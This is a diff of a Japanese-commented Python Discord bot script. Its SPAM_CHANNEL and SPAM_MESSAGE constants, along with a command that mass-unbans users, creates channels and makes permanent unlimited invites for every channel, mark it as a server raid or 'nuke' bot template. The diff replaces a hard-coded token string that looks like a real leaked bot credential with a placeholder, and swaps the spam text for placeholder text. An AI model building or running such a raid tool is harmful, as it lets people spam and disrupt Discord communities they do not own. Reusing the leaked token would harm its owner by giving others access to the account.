@@ -5,11 +5,11 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "OSENn0vvGghhU_7bK0u5wf_BYmWFj24E"
+token = "トークンを貼り付け"
 
 
-SPAM_CHANNEL =  ["ねずみに勝てると思うなよ(* '' )☆"]
-SPAM_MESSAGE = ["ねずみは最強:bangbang::fire:"]
+SPAM_CHANNEL =  ["spamチャンネルの名前"]
+SPAM_MESSAGE = ["spam実行時の連投メッセージ"]
 
 intents = discord.Intents.default()  # デフォルトのIntentsオブジェクトを生成
 intents.typing = False  # typingを受け取らないように
@@ -17,7 +17,7 @@ client = discord.Client(intents=intents)
 
 @client.event
 async def on_ready():
-   print('起動したよ！')
+   print('起動したにゃ！')
    await client.change_presence(activity=discord.Game(name="GG.☆.｡.:*・°"))
 
 @client.command()
@@ -68,7 +68,7 @@ async def hi(ctx):
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("ねずみは最強:fire:")
+    await guild.create_text_channel("クリエイトしたい文を入力")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
